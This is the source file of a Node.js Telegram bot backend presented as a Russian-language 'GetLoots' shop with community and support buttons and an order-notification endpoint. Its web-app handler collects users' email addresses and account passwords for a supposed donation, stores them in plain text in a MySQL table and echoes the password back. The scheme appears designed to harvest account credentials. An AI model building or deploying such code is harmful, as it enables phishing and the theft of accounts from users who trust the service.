require('dotenv').config();

const express = require('express');
const mysql = require('mysql2');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const bodyParser = require('body-parser');


const host = process.env.DB_HOST;
const port = process.env.DB_PORT;
const username = process.env.DB_USER;
const password = process.env.DB_PASSWORD;
const database = process.env.DB_DATABASE;

const webAppUrl = process.env.WEB_APP_URL;
const token = process.env.TELEGRAM_BOT_TOKEN;

const pool = mysql.createPool({
  host: host,
  port: port,
  user: username,
  password: password,
  database: database,
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

const bot = new TelegramBot(token, { polling: true });
const app = express();

app.use(express.json());
// app.use(cors());
app.use(cors({
  origin: '*', // Allow all origins
  methods: 'GET,POST', // Specify allowed methods
  allowedHeaders: 'Content-Type' // Specify allowed headers
}))
app.use(bodyParser.json());

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // await bot.sendMessage(chatId, 'Добро пожаловать ');

  // if (text === '/start') {
  //   await bot.sendMessage(chatId, 'Здесь вы сможете оформить заказ', {
  //     reply_markup: {
  //       inline_keyboard: [
  //         [{ text: 'Make zakaz', web_app: { url: webAppUrl } }]
  //       ]
  //     }
  //   });
  // }


  if (msg?.web_app_data?.data) {
    try {
      const data = JSON.parse(msg?.web_app_data?.data);
      const query = 'INSERT INTO users (email, password, subject) VALUES (?, ?, ?)';

      pool.execute(query, [data.email, data.password, data.subject], (err, results) => {
        if (err) {
          console.error('Error inserting data:', err);
          return;
        }
        console.log('Data saved with id:', results.insertId);
      });

      await bot.sendMessage(chatId, 'Спасибо за ваше доверие!');
      await bot.sendMessage(chatId, 'Ваш имейл: ' + data?.email);
      await bot.sendMessage(chatId, 'Ваш пароль: ' + data?.password);
      await bot.sendMessage(chatId, 'Донат в: ' + data?.subject);
    } catch (e) {
      console.log(e);
    }

    
  }
});




// bot.onText(/\/start/, (msg) => {
//   const chatId = msg.chat.id;
//   const message = `
// <b>Дорогой покупатель, добро пожаловать в наш магазин. Мы очень рады видеть вас с нами!</b>
//   `;
  
//   const options = {
//       parse_mode: 'HTML',
//       disable_web_page_preview: true,
//       reply_markup: {
//           inline_keyboard: [
//               [{ text: '💬 Комьюнити', callback_data: 'community' }],
//               [{ text: '📋 Дополнительная информация', callback_data: 'info' }],
//               [{ text: '❓ Помощь', callback_data: 'help' }]
//           ]
//       }
//   };
  
//   bot.sendMessage(chatId, message, options);
// });


// bot.on('callback_query', (query) => {
//   const chatId = query.message.chat.id;
//   let response = '';

//   switch (query.data) {
//       case 'community':
//           response = 'Будем рады видеть вас в нашем сообществе❤️ \n https://t.me/Get_L0ots';
//           break;
//       case 'info':
//           response = 'Информация...';
//           break;
//       case 'help':
//           response = 'За любыми воросами вы можете обращатся к нашему специалисту @1Login. ';
//           break;
//   }
  
//   bot.sendMessage(chatId, response);
// });




 
const initialMessage = `
<b>Дорогой покупатель, добро пожаловать в наш магазин. Мы очень рады видеть вас с нами!</b>
`;

const options = {
    parse_mode: 'HTML',
    disable_web_page_preview: true, // Adjust this based on whether you want the link preview
    reply_markup: {
        inline_keyboard: [
          [{ text: '💬 Комьюнити', callback_data: 'community' }],
          [{ text: '📋 Дополнительная информация', callback_data: 'info' }],
          [{ text: '❓ Помощь', callback_data: 'help' }]
        ]
    }
};


const comLink = `
Будем рады видеть вас в нашем сообществе❤️ \n https://t.me/Get_L0ots
`;

const backButtonOptions = {
    parse_mode: 'HTML',
    disable_web_page_preview: false, 
    reply_markup: {
        inline_keyboard: [
            [{ text: '🔙 Назад', callback_data: 'go_back' }]
        ]
    }
};

bot.onText(/\/start|\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, initialMessage, options);
});


bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;

    if (query.data === 'community') {

        bot.editMessageText(comLink, {
            chat_id: chatId,
            message_id: query.message.message_id,
            ...backButtonOptions
        });

    } else if (query.data === 'help') {
        const contactSupportMessage = `За любыми воросами вы можете обращатся к нашему специалисту @1Login. `;
        bot.editMessageText(contactSupportMessage, {
            chat_id: chatId,
            message_id: query.message.message_id,
            ...backButtonOptions
        });
    } else if (query.data === 'info') {
      const contactSupportMessage = `Information.. `;
      bot.editMessageText(contactSupportMessage, {
          chat_id: chatId,
          message_id: query.message.message_id,
          ...backButtonOptions
      });
  }else if (query.data === 'go_back') {
        // Return to the initial message
        bot.editMessageText(initialMessage, {
            chat_id: chatId,
            message_id: query.message.message_id,
            ...options
        });
    }
});




//send message about the order 
app.post('/save-cart', (req, res) => {
  const {username, product, totalPrice } = req.body;
  const message = `New order received from @${username}!\n\nProducts:\n${product.map(p => `${p.title} - ${p.price} руб`).join('\n')}\n\nTotal Price: ${totalPrice} руб`;

  // Send a message to you (the bot admin) via Telegram
  bot.sendMessage(process.env.GROUP_CHAT_ID, message);

  res.status(200).json({ message: 'Cart data saved and sent to Telegram.' });
});

//for form data
// app.post('/web-data', (req, res) => {
//   const { email, password, subject } = req.body;
//   console.log('Received data:', req.body);

//   const query = 'INSERT INTO users (email, password, subject) VALUES (?, ?, ?)';
//   pool.execute(query, [email, password, subject], (err, results) => {
//     if (err) {
//       console.error('Error inserting data:', err);
//       return res.status(500).json({ message: 'Internal Server Error' });
//     }
//     res.status(200).json({ message: 'Data saved successfully', id: results.insertId });
//   });
// });

// app.get('/', (req, res) => {
//   res.send('Welcome to the GetLoots API');
// });





app.post('/test', (req, res) => {
  res.status(200).json({ message: 'Test route is working!' });
});

const PORT =3001;
app.listen(PORT, () => console.log('Server started on PORT ' + PORT));

pool.getConnection((err, connection) => {
  if (err) {
    console.error('Error connecting to the database:', err);
  } else {
    console.log('Connected to the database');
    connection.release();
  }
});
